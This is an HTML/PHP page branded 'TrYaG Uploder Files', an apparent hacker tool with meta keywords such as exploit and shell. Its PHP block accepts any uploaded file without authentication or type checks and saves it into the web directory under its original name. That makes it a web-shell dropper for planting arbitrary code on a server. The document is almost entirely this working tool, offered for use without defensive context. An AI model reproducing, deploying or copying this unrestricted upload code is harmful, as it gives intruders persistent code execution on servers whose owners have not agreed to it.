<!DOCTYPE html>
<html>
<head>
  <title>-:: TrYaG Uploder Files ::-</title>
  <link rel="stylesheet" type="text/css" href="style.css">
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  <meta name="Uploder" content="Hacker, Penetration Testing, Pentest, Security, exploit, Cyber Security, Cyber, exploit, Shell, Tools Kali Linux, windows, linux">
</head>
<style>
.textbox1
{
display:none;
}
.error
{
     font-weight:bold;
     color:red;
}

.resp_code
{
margin:5px 10px 10px 300px;
padding:10px 20px 10px 20px;
font:normal 1em/1.3em Tahoma, Geneva, sans-serif;
color:#ffffff;
border:#ff5857 1px solid;
border-radius:.25em;
overflow:auto;width:25%;
}
.frms
{
	margin:0 auto;
	padding:10px;
	-moz-border-radius:.3em;
	-webkit-border-radius:.3em;
	-o-border-radius:.3em;
	font-family:Tahoma, Geneva, sans-serif;
	color:#ffffff;
	font-size:.9em;
	line-height:1.2em;
}

.heading {
  text-align: center;
  font: 250% impact;
  margin-top: 1vh;
}
.frms input:hover
{
	box-shadow:#ff5857 0px 0px 5px;
	-moz-box-shadow:#ff5857 0px 0px 5px;
	-webkit-box-shadow:#ff5857 0px 0px 5px;
	-o-box-shadow:#ff5857 0px 0px 5px;
}
.frms input:focus
{
	-webkit-box-shadow: inset 7px 4px 7px -7px rgba(0,0,0,0.42);
-moz-box-shadow: inset 7px 4px 7px -7px rgba(0,0,0,0.42);
box-shadow: inset 7px 4px 7px -7px rgba(0,0,0,0.42);
	
	border:#ff5857 1px solid;
}
.frms input[type="submit"],input[type="reset"],input[type="button"]
{
	padding:7px 14px;
	font-weight:bold;
	color:#fff;
	cursor:pointer;
	border-radius:.3em;
	-moz-border-radius:.2em;
	-webkit-border-radius:.2em;
	-o-border-radius:.2em;
	margin:10px 0;
	border:none;
}
.frms input[type="submit"]
{
	background:#2f3236;
	border-bottom:#ff5857 3px solid;
	text-shadow:#ff5857 1px 1px 0px;
}
.frms input[type="reset"]
{
	background:#2f3236;
	border-bottom:#ff5857 3px solid;
	text-shadow:#ff5857 1px 1px 0px;
}
input[type="button"]
{
	background:#2f3236;
	border-bottom:#ff5857 3px solid;
	text-shadow:#ff5857 1px 1px 0px;
}
@media screen and (max-width: 480px)
{
.resp_code
{width:auto !important;margin:0px !important;
}
}
</style>
<body>
<style>
body {
    background-color: #222427;
}
</style>
<div class="heading">
            <font>
              <span style="color: white;">-:: TrYaG Uploder Files ::-</span>
            </font>
        </div>
        <br>
<div class='resp_code frms'>
  <form enctype="multipart/form-data" action="" method="POST">
    <center><input type="file" name="uploaded_file"></input><br /></center>
    <center><input type="submit" value="Upload"></input></center>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      "<p style='color:green;'>Uploaded Done</p>";
    } else{
        echo "<p style='color:red;'>Error Uploading</p>";
    }
  }
?>
<br>
            <center><font>
              <span style="font-size: 15px;color: white;">Coder BY </span>
              <span style="font-size: 15px;color: #ff5857;">Faisal Alanazi</span><br>
              <span style="font-size: 15px;color: #ff5857;">&copy;</span>
              <b><a href="https://www.tryag.co" id="dum" style="font-size: 15px;color: #dadada;text-decoration:none;color: #dadada;">TrYaG 2020</a></b>
            </font></center>
